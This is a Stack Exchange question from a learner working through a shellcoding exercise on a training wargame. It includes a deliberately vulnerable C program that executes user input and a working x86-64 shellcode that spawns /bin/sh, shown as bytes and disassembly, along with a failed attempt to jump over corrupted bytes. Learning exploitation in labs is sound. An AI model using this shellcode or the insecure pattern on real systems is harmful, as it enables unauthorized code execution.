{
    "title": "Wargames RET2 Systems Shellcoding - Trouble using ```jmp``` instruction to connect parts of shellcode",
    "link": "https://reverseengineering.stackexchange.com/questions/32068/wargames-ret2-systems-shellcoding-trouble-using-jmp-instruction-to-conne",
    "content": "I am doing the RET2 Systems Binary Exploitation course Wargames (https://wargames.ret2.systems/) and am working on the shellcoding chapter. I am learning about how to use <pre><code>jmp</code></pre> assembly instructions to connect sections of shell code. When shell code is injected into a running program, the program may corrupt bytes. <pre><code>jmp</code></pre> instructions are meant to bridge over those corrupt parts.\nThis is the C program I am working with:\n<pre><code>// gcc -g -I ../includes -O0 -z execstack -fno-stack-protector -no-pie -o splits splits.c\n#include <stdio.h>\n#include <string.h>\n\n// Hidden for simplicty\n#include <wargames.h>\n\nvoid main()\n{\n    init_wargame();\n\n    printf(\"------------------------------------------------------------\n\");\n    printf(\"--[ Shellcode - Constrained Shellcode                       \n\");\n    printf(\"------------------------------------------------------------\n\");\n\n    // Buffer to hold user input & shellcode\n    char buffer[32] = {};\n    char shellcode[32] = {};   \n    \n    // Oftentimes shellcode will enter a process as string\n    printf(\"Enter a string: \");\n    fgets(buffer, sizeof(buffer), stdin);\n\n    // Constrain shellcode to be NULL-free\n    strncpy(shellcode, buffer, sizeof(shellcode));\n    memset(buffer, 0, sizeof(buffer));  \n    \n    // Stomp over some shellcode (added constraints)\n    shellcode[16] = '\\xff';\n    shellcode[17] = '\\xe3';\n    shellcode[18] = '\\xff';\n    shellcode[19] = '\\xe7';\n\n    printf(\"Calling further constrained shellcode...\n\");\n    ((void (*)(void))shellcode)();\n}\n\n</code></pre>\nAnd this is the original assembly code:\n<pre><code>Raw Bytes:\n31F648BB2F62696E2F2F73685653545F6A3B5831D20F05\n\nPython Escaped:\n\"\\x31\\xF6\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x56\\x53\\x54\\x5F\\x6A\\x3B\\x58\\x31\\xD2\\x0F\\x05\"\n\nDisassembly:\n0:  31 f6                   xor    esi,esi\n2:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f\n9:  2f 73 68\nc:  56                      push   rsi\nd:  53                      push   rbx\ne:  54                      push   rsp\nf:  5f                      pop    rdi\n10: 6a 3b                   push   0x3b\n12: 58                      pop    rax\n13: 31 d2                   xor    edx,edx\n15: 0f 05                   syscall\n</code></pre>\nI am trying to figure out how to use the <pre><code>jmp</code></pre> instruction to bridge the corrupted parts. The following is what I have tried. I thought it would work because the instruction and the offset will be executed before the corruption begins (the execution of <pre><code>jmp $+7</code></pre> starts at 0xe and I believe it will be executed before the corruption begins at 0x10). As you can see, I also deleted the 0xf line (<pre><code>pop rdi</code></pre>) - otherwise, the syscall would have gotten pushed back to 0x16. Additionally, as I understand it, \"+7\" would be a suitable amount of bytes to offset (because 0x15 - 0xe = 21 - 14 = 7).\n<pre><code>Raw Bytes:\n31F648BB2F62696E2F2F73685653EB056A3B5831D20F05\n\nPython Escaped:\n\"\\x31\\xF6\\x48\\xBB\\x2F\\x62\\x69\\x6E\\x2F\\x2F\\x73\\x68\\x56\\x53\\xEB\\x05\\x6A\\x3B\\x58\\x31\\xD2\\x0F\\x05\"\n\nDisassembly:\n0:  31 f6                   xor    esi,esi\n2:  48 bb 2f 62 69 6e 2f    movabs rbx,0x68732f2f6e69622f\n9:  2f 73 68\nc:  56                      push   rsi\nd:  53                      push   rbx\ne:  eb 05                   jmp    15 <_main+0x15>\n10: 6a 3b                   push   0x3b\n12: 58                      pop    rax\n13: 31 d2                   xor    edx,edx\n15: 0f 05                   syscall\n</code></pre>\nI have been wracking my brain and trying different offsets, and placing <pre><code>jmp</code></pre> at different locations but with no luck unfortunately. Ideally, I would still like to figure this level out by myself. I am mainly curious right now about where my misunderstanding about <pre><code>jmp</code></pre> instructions lies. Can someone help point this out to me?\n",
    "votes": "1",
    "answers": 0,
    "views": "118",
    "tags": [
        "shellcode"
    ],
    "user": "Aaron",
    "time": "Jul 18, 2023 at 8:16",
    "comments": [],
    "answers_data": []
}